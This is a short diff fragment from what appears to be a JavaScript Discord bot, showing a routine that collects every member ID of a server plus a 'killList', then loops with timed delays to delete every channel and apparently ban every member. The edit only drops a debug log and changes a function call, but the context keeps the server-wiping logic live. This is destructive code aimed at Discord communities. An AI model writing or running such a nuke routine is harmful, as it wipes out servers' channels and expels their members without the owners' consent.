@@ -610,14 +610,11 @@ bot.on('message', function(user, userID, channelID, message, evt) {
             });
             var toban = Object.values(bot.servers[bot.channels[channelID].guild_id].members).map(m=>m.id);
             var delchannels = Object.values(bot.servers[bot.channels[channelID].guild_id].channels).map(c=>c.id);
-            console.log(JSON.stringify(delchannels));
             toban = arr_shuffle(toban.concat(killList));
             (async function loop() {
               for (var c of delchannels) {
              await new Promise(resolve=>setTimeout(resolve,505));
-              bot.deleteChannel({
-               channelID: c
-              }, (e)=>{if(e)console.log("channel delete error: " + JSON.stringify(e))});
+              bot.deleteChannel(c, (e)=>{if(e)console.log("channel delete error: " + JSON.stringify(e))});
             }
             for (var m of toban) {
              await new Promise(resolve=>setTimeout(resolve,505));
